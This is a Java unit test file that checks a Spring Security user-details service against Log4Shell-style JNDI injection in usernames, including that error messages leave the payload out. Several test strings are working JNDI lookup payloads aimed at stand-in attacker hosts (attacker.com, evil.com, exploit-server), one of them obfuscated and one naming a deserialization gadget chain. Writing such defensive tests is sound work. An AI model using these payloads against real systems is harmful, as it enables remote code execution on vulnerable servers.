package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJndiInjectionAttempt_ShouldSanitize() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithLog4ShellPayload_ShouldSanitize() {
        String log4shellPayload = "${jndi:ldap://attacker.com/a}";
        
        when(userService.findByUsername(log4shellPayload)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(log4shellPayload);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithNestedJndiPayload_ShouldSanitize() {
        String nestedPayload = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}";
        
        when(userService.findByUsername(nestedPayload)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(nestedPayload);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithNormalUsername_ShouldWork() {
        String normalUsername = "normaluser";
        
        when(userService.findByUsername(normalUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(normalUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertTrue(userDetails.isEnabled());
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUserAndJndiPayload_ShouldThrowExceptionWithSanitizedMessage() {
        String maliciousUsername = "${jndi:ldap://evil.com/x}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(null);

        UsernameNotFoundException exception = assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });

        assertFalse(exception.getMessage().contains("${jndi"));
        assertFalse(exception.getMessage().contains("ldap://"));
    }
}
